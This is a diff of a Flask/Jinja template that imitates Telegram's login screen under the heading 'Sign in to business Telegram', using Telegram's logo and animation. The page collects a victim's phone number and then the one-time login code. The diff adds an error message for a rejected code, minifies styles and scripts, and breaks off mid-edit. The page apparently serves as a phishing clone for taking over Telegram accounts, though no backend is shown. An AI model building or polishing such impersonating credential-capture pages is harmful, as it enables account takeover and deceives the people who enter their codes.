@@ -10,47 +10,24 @@
             --tg-primary-blue: #3390ec; --tg-link-blue: #3275a7; --tg-body-bg: #fff;
             --input-border-color: #c8c8c8; --input-bg: rgba(255, 255, 255, 0.8);
             --dropdown-hover-bg: #f0f2f5;
+            --tg-error-red: #d9534f;
         }
         
         body[data-theme="dark"] {
-            --tg-bg: #212b36;
-            --tg-primary-text: #fff;
-            --tg-secondary-text: #8a949e;
-            --tg-body-bg: #18222d;
-            --tg-link-blue: #58a6ff;
-            --input-border-color: #4c5a67;
-            --input-bg: #212b36;
-            --dropdown-hover-bg: #2a3a49;
+            --tg-bg: #212b36; --tg-primary-text: #fff; --tg-secondary-text: #8a949e;
+            --tg-body-bg: #18222d; --tg-link-blue: #58a6ff; --input-border-color: #4c5a67;
+            --input-bg: #212b36; --dropdown-hover-bg: #2a3a49; --tg-error-red: #ff7b72;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: var(--tg-body-bg); display: flex; align-items: center; justify-content: center; height: 100vh; transition: background-color 0.3s; }
         .login-container { position: relative; background-color: var(--tg-bg); padding: 50px 40px 40px 40px; text-align: center; width: 100%; max-width: 360px; transition: background-color 0.3s;}
         
-        /* Theme Toggle Button */
-        .theme-toggle {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            border: none;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            transition: background-color 0.3s ease;
-        }
+        .theme-toggle { position: absolute; top: 15px; right: 15px; width: 32px; height: 32px; border-radius: 50%; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; color: white; transition: background-color 0.3s ease; }
         .theme-toggle svg { width: 18px; height: 18px; }
-        
-        /* Light mode toggle style */
         body:not([data-theme="dark"]) .theme-toggle { background-color: #5294d1; }
         body:not([data-theme="dark"]) .theme-toggle .sun-icon { display: none; }
         body:not([data-theme="dark"]) .theme-toggle .moon-icon { display: block; }
-        
-        /* Dark mode toggle style */
         body[data-theme="dark"] .theme-toggle { background-color: #2a3a49; }
         body[data-theme="dark"] .theme-toggle .sun-icon { display: block; }
         body[data-theme="dark"] .theme-toggle .moon-icon { display: none; }
@@ -70,12 +47,10 @@
             border-radius: 8px; font-size: 16px; background: var(--input-bg); -webkit-appearance: none;
             color: var(--tg-primary-text);
         }
-        
         .form-input:focus { outline: none; border-color: var(--tg-primary-blue); }
         .form-input:focus + label, .form-input:not(:placeholder-shown) + label, .form-input.has-content + label { 
             top: -8px; left: 12px; font-size: 12px; color: var(--tg-link-blue); 
         }
-
         .phone-input-wrapper { display: flex; align-items: center; }
         #country-code { padding-right: 10px; font-size: 16px; color: var(--tg-primary-text); }
         #phone-number-input { flex-grow: 1; border: none; outline: none; background: transparent; padding: 0; font-size: 16px; font-family: inherit; color: var(--tg-primary-text); }
@@ -84,71 +59,36 @@
         .phone-display { font-size: 24px; font-weight: 500; margin: 20px 0 10px; display: flex; align-items: center; justify-content: center; color: var(--tg-primary-text); }
         .edit-icon { width: 20px; height: 20px; margin-left: 10px; cursor: pointer; color: var(--tg-secondary-text); }
         .code-input { text-align: center; }
-
-        /* Country Picker */
+        .error-message { color: var(--tg-error-red); font-size: 14px; margin-top: -15px; margin-bottom: 25px; }
+        
         #country-picker-container { position: relative; cursor: pointer; }
-        .dropdown-arrow {
-            position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
-            pointer-events: none; transition: transform 0.2s ease; color: var(--tg-secondary-text);
-        }
+        .dropdown-arrow { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); pointer-events: none; transition: transform 0.2s ease; color: var(--tg-secondary-text); }
         #country-picker-container.open .dropdown-arrow { transform: translateY(-50%) rotate(180deg); }
         .country-dropdown-list {
             position: absolute; top: calc(100% + 4px); left: 0; width: 100%; background: var(--tg-bg);
             border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); max-height: 220px;
             overflow-y: auto; z-index: 1000; border: 1px solid var(--input-border-color);
         }
-        .country-item {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 10px 16px; cursor: pointer; font-size: 16px; color: var(--tg-primary-text);
-        }
+        .country-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 16px; cursor: pointer; font-size: 16px; color: var(--tg-primary-text); }
         .country-item:hover { background-color: var(--dropdown-hover-bg); }
         .country-item .flag-name { display: flex; align-items: center; gap: 12px; }
         .country-item .country-code { color: var(--tg-secondary-text); }
-
-        /* Checkbox */
         .checkbox-wrapper { display: flex; align-items: center; justify-content: flex-start; cursor: pointer; }
         .checkbox-wrapper input[type="checkbox"] { position: absolute; opacity: 0; width: 0; height: 0; }
-        .checkbox-wrapper label {
-            display: flex; align-items: center; font-size: 16px;
-            color: var(--tg-primary-text); cursor: pointer; user-select: none;
-        }
-        .checkbox-wrapper label::before {
-            content: ''; display: inline-block; width: 18px; height: 18px;
-            border: 1.5px solid var(--input-border-color); border-radius: 4px;
-            margin-right: 12px; transition: background-color 0.2s, border-color 0.2s; flex-shrink: 0;
-        }
-        .checkbox-wrapper input[type="checkbox"]:checked + label::before {
-            background-color: var(--tg-primary-blue); border-color: var(--tg-primary-blue);
-            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 12 9'%3e%3cpath fill='none' stroke='%23fff' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M1 4.5L5 8L11 1'/%3e%3c/svg%3e");
-            background-repeat: no-repeat; background-position: center; background-size: 10px;
-        }
+        .checkbox-wrapper label { display: flex; align-items: center; font-size: 16px; color: var(--tg-primary-text); cursor: pointer; user-select: none; }
+        .checkbox-wrapper label::before { content: ''; display: inline-block; width: 18px; height: 18px; border: 1.5px solid var(--input-border-color); border-radius: 4px; margin-right: 12px; transition: background-color 0.2s, border-color 0.2s; flex-shrink: 0; }
+        .checkbox-wrapper input[type="checkbox"]:checked + label::before { background-color: var(--tg-primary-blue); border-color: var(--tg-primary-blue); background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 12 9'%3e%3cpath fill='none' stroke='%23fff' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M1 4.5L5 8L11 1'/%3e%3c/svg%3e"); background-repeat: no-repeat; background-position: center; background-size: 10px; }
     </style>
 </head>
 <body>
 <div class="login-container">
     <button id="theme-toggle" class="theme-toggle" aria-label="Toggle dark mode">
-        <svg class="moon-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
-            <path d="M12.3,4.9C12.2,4.9,12.2,4.9,12.3,4.9c-3.4,0-6.2,2.8-6.2,6.2s2.8,6.2,6.2,6.2c3.4,0,6.2-2.8,6.2-6.2 C18.5,8.2,15.9,5.3,12.3,4.9z M13.8,15.9c-0.3,0.1-0.6,0.1-0.9,0.1c-2.4,0-4.3-1.9-4.3-4.3c0-0.9,0.3-1.8,0.8-2.5 c-0.3,0-0.5-0.1-0.8-0.1c-2.4,0-4.3,1.9-4.3,4.3s1.9,4.3,4.3,4.3c1.2,0,2.2-0.5,3-1.2C14.3,16.3,14,16.1,13.8,15.9z"/>
-            <path d="M19.1,3.4l-1.1,1.1c-0.2,0.2-0.2,0.5,0,0.7c0.2,0.2,0.5,0.2,0.7,0l1.1-1.1c0.2-0.2,0.2-0.5,0-0.7C19.6,3.2,19.3,3.2,19.1,3.4z"/>
-            <path d="M22.6,9.6h-1.6c-0.3,0-0.5,0.2-0.5,0.5s0.2,0.5,0.5,0.5h1.6c0.3,0,0.5-0.2,0.5-0.5S22.9,9.6,22.6,9.6z"/>
-        </svg>
-        <svg class="sun-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
-             <path d="M12,9c-1.7,0-3,1.3-3,3s1.3,3,3,3s3-1.3,3-3S13.7,9,12,9z M12,14c-1.1,0-2-0.9-2-2s0.9-2,2-2s2,0.9,2,2S13.1,14,12,14z" />
-             <path d="M12,3.5c-0.3,0-0.5-0.2-0.5-0.5v-2c0-0.3,0.2-0.5,0.5-0.5s0.5,0.2,0.5,0.5v2C12.5,3.3,12.3,3.5,12,3.5z"/>
-             <path d="M12,23.5c-0.3,0-0.5-0.2-0.5-0.5v-2c0-0.3,0.2-0.5,0.5-0.5s0.5,0.2,0.5,0.5v2C12.5,23.3,12.3,23.5,12,23.5z"/>
-             <path d="M5.4,6.4c-0.1,0-0.2,0-0.4-0.1L3.3,5.1C3.1,4.9,3.1,4.6,3.3,4.4s0.5-0.2,0.7,0l1.8,1.2c0.2,0.2,0.3,0.5,0.1,0.7 C5.8,6.3,5.6,6.4,5.4,6.4z"/>
-             <path d="M18.6,19.9c-0.1,0-0.2,0-0.4-0.1c-0.2-0.2-0.2-0.5,0-0.7l1.8-1.2c0.2-0.2,0.5-0.3,0.7-0.1s0.2,0.5,0.1,0.7l-1.8,1.2 C18.9,19.8,18.8,19.9,18.6,19.9z"/>
-             <path d="M22,12.5h-2c-0.3,0-0.5-0.2-0.5-0.5s0.2-0.5,0.5-0.5h2c0.3,0,0.5,0.2,0.5,0.5S22.3,12.5,22,12.5z"/>
-             <path d="M4,12.5H2c-0.3,0-0.5-0.2-0.5-0.5s0.2-0.5,0.5-0.5h2c0.3,0,0.5,0.2,0.5,0.5S4.3,12.5,4,12.5z"/>
-             <path d="M18.6,6.4c-0.2,0-0.4-0.1-0.5-0.2c-0.2-0.2-0.2-0.5,0-0.7l1.8-1.2c0.2-0.2,0.5-0.2,0.7,0s0.2,0.5,0,0.7l-1.8,1.2 C18.9,6.3,18.7,6.4,18.6,6.4z"/>
-             <path d="M5.4,19.9c-0.2,0-0.4-0.1-0.5-0.2c-0.2-0.2-0.2-0.5-0.1-0.7l1.8-1.2c0.2-0.2,0.5-0.2,0.7,0s0.2,0.5,0,0.7l-1.8,1.2 C5.7,19.8,5.6,19.9,5.4,19.9z"/>
-        </svg>
+        <svg class="moon-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12.3,4.9C12.2,4.9,12.2,4.9,12.3,4.9c-3.4,0-6.2,2.8-6.2,6.2s2.8,6.2,6.2,6.2c3.4,0,6.2-2.8,6.2-6.2 C18.5,8.2,15.9,5.3,12.3,4.9z M13.8,15.9c-0.3,0.1-0.6,0.1-0.9,0.1c-2.4,0-4.3-1.9-4.3-4.3c0-0.9,0.3-1.8,0.8-2.5 c-0.3,0-0.5-0.1-0.8-0.1c-2.4,0-4.3,1.9-4.3,4.3s1.9,4.3,4.3,4.3c1.2,0,2.2-0.5,3-1.2C14.3,16.3,14,16.1,13.8,15.9z"/><path d="M19.1,3.4l-1.1,1.1c-0.2,0.2-0.2,0.5,0,0.7c0.2,0.2,0.5,0.2,0.7,0l1.1-1.1c0.2-0.2,0.2-0.5,0-0.7C19.6,3.2,19.3,3.2,19.1,3.4z"/><path d="M22.6,9.6h-1.6c-0.3,0-0.5,0.2-0.5,0.5s0.2,0.5,0.5,0.5h1.6c0.3,0,0.5-0.2,0.5-0.5S22.9,9.6,22.6,9.6z"/></svg>
+        <svg class="sun-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12,9c-1.7,0-3,1.3-3,3s1.3,3,3,3s3-1.3,3-3S13.7,9,12,9z M12,14c-1.1,0-2-0.9-2-2s0.9-2,2-2s2,0.9,2,2S13.1,14,12,14z" /><path d="M12,3.5c-0.3,0-0.5-0.2-0.5-0.5v-2c0-0.3,0.2-0.5,0.5-0.5s0.5,0.2,0.5,0.5v2C12.5,3.3,12.3,3.5,12,3.5z"/><path d="M12,23.5c-0.3,0-0.5-0.2-0.5-0.5v-2c0-0.3,0.2-0.5,0.5-0.5s0.5,0.2,0.5,0.5v2C12.5,23.3,12.3,23.5,12,23.5z"/><path d="M5.4,6.4c-0.1,0-0.2,0-0.4-0.1L3.3,5.1C3.1,4.9,3.1,4.6,3.3,4.4s0.5-0.2,0.7,0l1.8,1.2c0.2,0.2,0.3,0.5,0.1,0.7 C5.8,6.3,5.6,6.4,5.4,6.4z"/><path d="M18.6,19.9c-0.1,0-0.2,0-0.4-0.1c-0.2-0.2-0.2-0.5,0-0.7l1.8-1.2c0.2-0.2,0.5-0.3,0.7-0.1s0.2,0.5,0.1,0.7l-1.8,1.2 C18.9,19.8,18.8,19.9,18.6,19.9z"/><path d="M22,12.5h-2c-0.3,0-0.5-0.2-0.5-0.5s0.2-0.5,0.5-0.5h2c0.3,0,0.5,0.2,0.5,0.5S22.3,12.5,22,12.5z"/><path d="M4,12.5H2c-0.3,0-0.5-0.2-0.5-0.5s0.2-0.5,0.5-0.5h2c0.3,0,0.5,0.2,0.5,0.5S4.3,12.5,4,12.5z"/><path d="M18.6,6.4c-0.2,0-0.4-0.1-0.5-0.2c-0.2-0.2-0.2-0.5,0-0.7l1.8-1.2c0.2-0.2,0.5-0.2,0.7,0s0.2,0.5,0,0.7l-1.8,1.2 C18.9,6.3,18.7,6.4,18.6,6.4z"/><path d="M5.4,19.9c-0.2,0-0.4-0.1-0.5-0.2c-0.2-0.2-0.2-0.5-0.1-0.7l1.8-1.2c0.2-0.2,0.5-0.2,0.7,0s0.2,0.5,0,0.7l-1.8,1.2 C5.7,19.8,5.6,19.9,5.4,19.9z"/></svg>
     </button>
 
     {% if step == 'enter_phone' %}
-    <div class="telegram-logo">
-        <img src="{{ url_for('static', filename='img/telegram-logo.png') }}" alt="Telegram Logo">
-    </div>
+    <div class="telegram-logo"><img src="{{ url_for('static', filename='img/telegram-logo.png') }}" alt="Telegram Logo"></div>
     <h1>Sign in to business Telegram</h1>
     <p class="subtitle">Please confirm your country code and enter your phone number.</p>
     <form action="{{ url_for('send_otp') }}" method="POST">
@@ -156,14 +96,8 @@
             <div id="country-picker-container">
                 <input type="text" id="country-input" class="form-input" placeholder=" " autocomplete="off">
                 <label for="country-input">Country</label>
-                <div class="dropdown-arrow">
-                    <svg width="10" height="5" viewBox="0 0 10 5" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M0 0L5 5L10 0" fill="currentColor"/>
-                    </svg>
-                </div>
-                <div id="country-dropdown" class="country-dropdown-list" style="display: none;">
-                    <!-- Populated by JS -->
-                </div>
+                <div class="dropdown-arrow"><svg width="10" height="5" viewBox="0 0 10 5" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 0L5 5L10 0" fill="currentColor"/></svg></div>
+                <div id="country-dropdown" class="country-dropdown-list" style="display: none;"></div>
             </div>
         </div>
         <div class="form-group">
@@ -182,15 +116,19 @@
     </form>
     {% elif step == 'enter_code' %}
     <div class="video-monkey-container">
-        <video autoplay loop muted playsinline>
-            <source src="{{ url_for('static', filename='video/monkeyanimation.mp4') }}" type="video/mp4">
-        </video>
+        <video autoplay loop muted playsinline><source src="{{ url_for('static', filename='video/monkeyanimation.mp4') }}" type="video/mp4"></video>
     </div>
     <div class="phone-display">
         <span id="phone-display-span">{{ phone }}</span>
         <a href="/" class="edit-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M20.71,7.04C21.1,6.65 21.1,6 20.71,5.63L18.37,3.29C18,2.9 17.35,2.9 16.96,3.29L15.13,5.12L18.88,8.87M3,17.25V21H6.75L17.81,9.94L14.06,6.19L3,17.25Z"></path></svg></a>
     </div>
-    <p class="subtitle">We've sent the code to the Telegram app on your other device.</p>
+    
+    {% if error %}
+        <p class="subtitle error-message">{{ error }}</p>
+    {% else %}
+        <p class="subtitle">We've sent the code to the Telegram app on your other device.</p>
+    {% endif %}
+
     <form action="{{ url_for('login') }}" method="POST" id="otp-form">
         <div class="form-group">
             <input type="text" id="code" name="code" class="form-input code-input" required autofocus placeholder=" " autocomplete="off" maxlength="5">
@@ -201,182 +139,60 @@
 </div>
 <script>
     document.addEventListener('DOMContentLoaded', function() {
-        // --- Theme Toggler ---
         const themeToggleButton = document.getElementById('theme-toggle');
         const body = document.body;
-
-        // Function to apply the theme
         const applyTheme = (theme) => {
-            if (theme === 'dark') {
-                body.setAttribute('data-theme', 'dark');
-            } else {
-                body.removeAttribute('data-theme');
-            }
+            if (theme === 'dark') { body.setAttribute('data-theme', 'dark'); } 
+            else { body.removeAttribute('data-theme'); }
             localStorage.setItem('theme', theme);
         };
-
-        // Event listener for the toggle button
         themeToggleButton.addEventListener('click', () => {
             const currentTheme = body.getAttribute('data-theme') ? 'dark' : 'light';
             const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
             applyTheme(newTheme);
         });
-
-        // Check for saved theme in localStorage or system preference on load
         const savedTheme = localStorage.getItem('theme');
         const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+        if (savedTheme) { applyTheme(savedTheme); } 
+        else if (prefersDark) { applyTheme('dark'); }
 
-        if (savedTheme) {
-            applyTheme(savedTheme);
-        } else if (prefersDark) {
-            applyTheme('dark');
-        }
-
-        // --- Rest of the Script ---
         function getFlagEmoji(countryName) {
-            const emojiMap = {
-                "India": "🇮🇳", "United States": "🇺🇸", "United Kingdom": "🇬🇧", "Afghanistan": "🇦🇫", "Albania": "🇦🇱",
-                "Algeria": "🇩🇿", "Andorra": "🇦🇩", "Angola": "🇦🇴", "Argentina": "🇦🇷", "Armenia": "🇦🇲", "Australia": "🇦🇺",
-                "Austria": "🇦🇹", "Azerbaijan": "🇦🇿", "Bahrain": "🇧🇭", "Bangladesh": "🇧🇩", "Belarus": "🇧🇾", "Belgium": "🇧🇪",
-                "Brazil": "🇧🇷", "Canada": "🇨🇦", "Chad": "🇹🇩", "Chile": "🇨🇱", "China": "🇨🇳", "Colombia": "🇨🇴", "Denmark": "🇩🇰", "Egypt": "🇪🇬",
-                "France": "🇫🇷", "Germany": "🇩🇪", "Greece": "🇬🇷", "Hong Kong": "🇭🇰", "Indonesia": "🇮🇩", "Iran": "🇮🇷",
-                "Iraq": "🇮🇶", "Ireland": "🇮🇪", "Italy": "🇮🇹", "Japan": "🇯🇵", "Malaysia": "🇲🇾", "Mexico": "🇲🇽",
-                "Netherlands": "🇳🇱", "New Zealand": "🇳🇿", "Nigeria": "🇳🇬", "Norway": "🇳🇴", "Pakistan": "🇵🇰",
-                "Philippines": "🇵🇭", "Poland": "🇵🇱", "Portugal": "🇵🇹", "Qatar": "🇶🇦", "Russia": "🇷🇺",
-                "Saudi Arabia": "🇸🇦", "Singapore": "🇸🇬", "South Africa": "🇿🇦", "South Korea": "🇰🇷",
-                "Spain": "🇪🇸", "Sri Lanka": "🇱🇰", "Sweden": "🇸🇪", "Switzerland": "🇨🇭", "Thailand": "🇹🇭",
-                "Turkey": "🇹🇷", "Ukraine": "🇺🇦", "United Arab Emirates": "🇦🇪"
-            };
+            const emojiMap = { "India": "🇮🇳", "United States": "🇺🇸", "United Kingdom": "🇬🇧", "Afghanistan": "🇦🇫", "Albania": "🇦🇱", "Algeria": "🇩🇿", "Andorra": "🇦🇩", "Angola": "🇦🇴", "Argentina": "🇦🇷", "Armenia": "🇦🇲", "Australia": "🇦🇺", "Austria": "🇦🇹", "Azerbaijan": "🇦🇿", "Bahrain": "🇧🇭", "Bangladesh": "🇧🇩", "Belarus": "🇧🇾", "Belgium": "🇧🇪", "Brazil": "🇧🇷", "Canada": "🇨🇦", "Chad": "🇹🇩", "Chile": "🇨🇱", "China": "🇨🇳", "Colombia": "🇨🇴", "Denmark": "🇩🇰", "Egypt": "🇪🇬", "France": "🇫🇷", "Germany": "🇩🇪", "Greece": "🇬🇷", "Hong Kong": "🇭🇰", "Indonesia": "🇮🇩", "Iran": "🇮🇷", "Iraq": "🇮🇶", "Ireland": "🇮🇪", "Italy": "🇮🇹", "Japan": "🇯🇵", "Malaysia": "🇲🇾", "Mexico": "🇲🇽", "Netherlands": "🇳🇱", "New Zealand": "🇳🇿", "Nigeria": "🇳🇬", "Norway": "🇳🇴", "Pakistan": "🇵🇰", "Philippines": "🇵🇭", "Poland": "🇵🇱", "Portugal": "🇵🇹", "Qatar": "🇶🇦", "Russia": "🇷🇺", "Saudi Arabia": "🇸🇦", "Singapore": "🇸🇬", "South Africa": "🇿🇦", "South Korea": "🇰🇷", "Spain": "🇪🇸", "Sri Lanka": "🇱🇰", "Sweden": "🇸🇪", "Switzerland": "🇨🇭", "Thailand": "🇹🇭", "Turkey": "🇹🇷", "Ukraine": "🇺🇦", "United Arab Emirates": "🇦🇪" };
             return emojiMap[countryName] || "🏳️";
         }
-
         if (document.getElementById('country-picker-container')) {
-            const countries = [
-                {name: 'India', code: '91'}, {name: 'United States', code: '1'}, {name: 'United Kingdom', code: '44'},
-                {name: 'Afghanistan', code: '93'}, {name: 'Albania', code: '355'}, {name: 'Algeria', code: '213'},
-                {name: 'Andorra', code: '376'}, {name: 'Angola', code: '244'}, {name: 'Argentina', code: '54'},
-                {name: 'Armenia', code: '374'}, {name: 'Australia', code: '61'}, {name: 'Austria', code: '43'},
-                {name: 'Azerbaijan', code: '994'}, {name: 'Bahrain', code: '973'}, {name: 'Bangladesh', code: '880'},
-                {name: 'Belarus', code: '375'}, {name: 'Belgium', code: '32'}, {name: 'Brazil', code: '55'},
-                {name: 'Canada', code: '1'}, {name: 'Chad', code: '235'}, {name: 'Chile', code: '56'}, {name: 'China', code: '86'}, {name: 'Colombia', code: '57'},
-                {name: 'Denmark', code: '45'}, {name: 'Egypt', code: '20'}, {name: 'France', code: '33'},
-                {name: 'Germany', code: '49'}, {name: 'Greece', code: '30'}, {name: 'Hong Kong', code: '852'},
-                {name: 'Indonesia', code: '62'}, {name: 'Iran', code: '98'}, {name: 'Iraq', code: '964'},
-                {name: 'Ireland', code: '353'}, {name: 'Italy', code: '39'}, {name: 'Japan', code: '81'},
-                {name: 'Malaysia', code: '60'}, {name: 'Mexico', code: '52'}, {name: 'Netherlands', code: '31'},
-                {name: 'New Zealand', code: '64'}, {name: 'Nigeria', code: '234'}, {name: 'Norway', code: '47'},
-                {name: 'Pakistan', code: '92'}, {name: 'Philippines', code: '63'}, {name: 'Poland', code: '48'},
-                {name: 'Portugal', code: '351'}, {name: 'Qatar', code: '974'}, {name: 'Russia', code: '7'},
-                {name: 'Saudi Arabia', code: '966'}, {name: 'Singapore', code: '65'}, {name: 'South Africa', code: '27'},
-                {name: 'South Korea', code: '82'}, {name: 'Spain', code: '34'}, {name: 'Sri Lanka', code: '94'},
-                {name: 'Sweden', code: '46'}, {name: 'Switzerland', code: '41'}, {name: 'Thailand', code: '66'},
-                {name: 'Turkey', code: '90'}, {name: 'Ukraine', code: '380'}, {name: 'United Arab Emirates', code: '971'}
-            ];
+            const countries = [ {name: 'India', code: '91'}, {name: 'United States', code: '1'}, {name: 'United Kingdom', code: '44'}, {name: 'Afghanistan', code: '93'}, {name: 'Albania', code: '355'}, {name: 'Algeria', code: '213'}, {name: 'Andorra', code: '376'}, {name: 'Angola', code: '244'}, {name: 'Argentina', code: '54'}, {name: 'Armenia', code: '374'}, {name: 'Australia', code: '61'}, {name: 'Austria', code: '43'}, {name: 'Azerbaijan', code: '994'}, {name: 'Bahrain', code: '973'}, {name: 'Bangladesh', code: '880'}, {name: 'Belarus', code: '375'}, {name: 'Belgium', code: '32'}, {name: 'Brazil', code: '55'}, {name: 'Canada', code: '1'}, {name: 'Chad', code: '235'}, {name: 'Chile', code: '56'}, {name: 'China', code: '86'}, {name: 'Colombia', code: '57'}, {name: 'Denmark', code: '45'}, {name: 'Egypt', code: '20'}, {name: 'France', code: '33'}, {name: 'Germany', code: '49'}, {name: 'Greece', code: '30'}, {name: 'Hong Kong', code: '852'}, {name: 'Indonesia', code: '62'}, {name: 'Iran', code: '98'}, {name: 'Iraq', code: '964'}, {name: 'Ireland', code: '353'}, {name: 'Italy', code: '39'}, {name: 'Japan', code: '81'}, {name: 'Malaysia', code: '60'}, {name: 'Mexico', code: '52'}, {name: 'Netherlands', code: '31'}, {name: 'New Zealand', code: '64'}, {name: 'Nigeria', code: '234'}, {name: 'Norway', code: '47'}, {name: 'Pakistan', code: '92'}, {name: 'Philippines', code: '63'}, {name: 'Poland', code: '48'}, {name: 'Portugal', code: '351'}, {name: 'Qatar', code: '974'}, {name: 'Russia', code: '7'}, {name: 'Saudi Arabia', code: '966'}, {name: 'Singapore', code: '65'}, {name: 'South Africa', code: '27'}, {name: 'South Korea', code: '82'}, {name: 'Spain', code: '34'}, {name: 'Sri Lanka', code: '94'}, {name: 'Sweden', code: '46'}, {name: 'Switzerland', code: '41'}, {name: 'Thailand', code: '66'}, {name: 'Turkey', code: '90'}, {name: 'Ukraine', code: '380'}, {name: 'United Arab Emirates', code: '971'} ];
             countries.sort((a, b) => a.name.localeCompare(b.name));
-
-            const picker = document.getElementById('country-picker-container');
-            const countryInput = document.getElementById('country-input');
-            const dropdown = document.getElementById('country-dropdown');
-            const countryCodeSpan = document.getElementById('country-code');
-            const phoneNumberInput = document.getElementById('phone-number-input');
-            const fullPhoneNumberInput = document.getElementById('full-phone-number');
-
+            const picker = document.getElementById('country-picker-container'); const countryInput = document.getElementById('country-input'); const dropdown = document.getElementById('country-dropdown'); const countryCodeSpan = document.getElementById('country-code'); const phoneNumberInput = document.getElementById('phone-number-input'); const fullPhoneNumberInput = document.getElementById('full-phone-number');
             let selectedCountryCode = '91';
-
-            function updatePhone() {
-                countryCodeSpan.textContent = `+${selectedCountryCode}`;
-                fullPhoneNumberInput.value = `+${selectedCountryCode}${phoneNumberInput.value.replace(/\s/g, '')}`;
-            }
-            
-            function selectCountry(country, fromDropdown = false) {
-                selectedCountryCode = country.code;
-                countryInput.value = country.name;
-                countryInput.classList.add('has-content');
-                if(fromDropdown) {
-                    countryInput.focus();
-                }
-                updatePhone();
-                closeDropdown();
-            }
-
-            function renderDropdown(filteredCountries) {
-                dropdown.innerHTML = '';
-                filteredCountries.forEach(c => {
-                    const item = document.createElement('div');
-                    item.classList.add('country-item');
-                    item.innerHTML = `<div class="flag-name"><span>${getFlagEmoji(c.name)}</span><span>${c.name}</span></div><span class="country-code">+${c.code}</span>`;
-                    item.addEventListener('click', () => selectCountry(c, true));
-                    dropdown.appendChild(item);
-                });
-            }
-            
-            function openDropdown() {
-                renderDropdown(countries);
-                dropdown.style.display = 'block';
-                picker.classList.add('open');
-            }
-
-            function closeDropdown() {
-                dropdown.style.display = 'none';
-                picker.classList.remove('open');
-            }
-
-            picker.addEventListener('click', (e) => {
-                if(dropdown.style.display === 'none' && e.target.id === 'country-input') {
-                   openDropdown();
-                }
-            });
-            
-            countryInput.addEventListener('input', () => {
-                const query = countryInput.value.toLowerCase();
-                const filtered = countries.filter(c => c.name.toLowerCase().startsWith(query));
-                renderDropdown(filtered);
-                if (dropdown.style.display === 'none') {
-                    dropdown.style.display = 'block';
-                    picker.classList.add('open');
-                }
-                countryInput.value ? countryInput.classList.add('has-content') : countryInput.classList.remove('has-content');
-            });
-            
-            document.addEventListener('click', (e) => {
-                if (!picker.contains(e.target)) {
-                    closeDropdown();
-                    const currentCountry = countries.find(c => c.code === selectedCountryCode);
-                    if(currentCountry) {
-                        countryInput.value = currentCountry.name;
-                        countryInput.classList.add('has-content');
-                    }
-                }
-            });
-            
+            function updatePhone() { countryCodeSpan.textContent = `+${selectedCountryCode}`; fullPhoneNumberInput.value = `+${selectedCountryCode}${phoneNumberInput.value.replace(/\s/g, '')}`; }
+            function selectCountry(country, fromDropdown = false) { selectedCountryCode = country.code; countryInput.value = country.name; countryInput.classList.add('has-content'); if(fromDropdown) { phoneNumberInput.focus(); } updatePhone(); closeDropdown(); }
+            function renderDropdown(filteredCountries) { dropdown.innerHTML = ''; filteredCountries.forEach(c => { const item = document.createElement('div'); item.classList.add('country-item'); item.innerHTML = `<div class="flag-name"><span>${getFlagEmoji(c.name)}</span><span>${c.name}</span></div><span class="country-code">+${c.code}</span>`; item.addEventListener('click', () => selectCountry(c, true)); dropdown.appendChild(item); }); }
+            function openDropdown() { renderDropdown(countries); dropdown.style.display = 'block'; picker.classList.add('open'); }
+            function closeDropdown() { dropdown.style.display = 'none'; picker.classList.remove('open'); }
+            picker.addEventListener('click', (e) => { if(dropdown.style.display === 'none') { openDropdown(); } });
+            countryInput.addEventListener('input', () => { const query = countryInput.value.toLowerCase(); const filtered = countries.filter(c => c.name.toLowerCase().startsWith(query)); renderDropdown(filtered); if (dropdown.style.display === 'none') { dropdown.style.display = 'block'; picker.classList.add('open'); } countryInput.value ? countryInput.classList.add('has-content') : countryInput.classList.remove('has-content'); });
+            document.addEventListener('click', (e) => { if (!picker.contains(e.target)) { closeDropdown(); const currentCountry = countries.find(c => c.code === selectedCountryCode); if(currentCountry) { countryInput.value = currentCountry.name; countryInput.classList.add('has-content'); } } });
             phoneNumberInput.addEventListener('input', updatePhone);
-            
-            // Set initial state
-            const defaultCountry = countries.find(c => c.name === "India");
-            if (defaultCountry) {
-                selectCountry(defaultCountry);
-            }
-            updatePhone();
+            const defaultCountry = countries.find(c => c.name === "India"); if (defaultCountry) { selectCountry(defaultCountry); } updatePhone();
         }
-
         const phoneSpan = document.getElementById('phone-display-span');
         if (phoneSpan) {
             let rawPhone = phoneSpan.textContent.trim();
-            let formattedPhone = rawPhone;
-            if (rawPhone.startsWith('+91') && rawPhone.length === 13) {
-                formattedPhone = `${rawPhone.slice(0, 3)} ${rawPhone.slice(3, 8)} ${rawPhone.slice(8)}`;
+            // --- THE FIX: The JS formatting logic for the phone number display ---
+            let formattedPhone = rawPhone.replace(/\s/g, ''); // Remove existing spaces first
+            if (formattedPhone.startsWith('+91') && formattedPhone.length === 13) {
